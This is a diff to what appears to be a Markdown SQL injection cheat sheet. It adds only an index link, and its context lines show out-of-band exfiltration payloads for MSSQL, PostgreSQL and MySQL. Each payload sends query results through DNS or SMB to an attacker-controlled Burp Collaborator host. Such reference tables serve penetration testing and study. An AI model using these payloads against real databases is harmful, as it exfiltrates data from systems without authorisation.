@@ -129,3 +129,6 @@
 | **Microsoft**  | `DECLARE @p VARCHAR(1024); SET @p=(SELECT QUERY); EXEC('master..xp_dirtree "//'+@p+'.BURP/a"')` |
 | **PostgreSQL** | Custom function calling `nslookup (SELECT QUERY).BURP`                                          |
 | **MySQL**      | `SELECT QUERY INTO OUTFILE '\\\\BURP\\a'` _(Windows only)_                                      |
+
+
+[[index]]
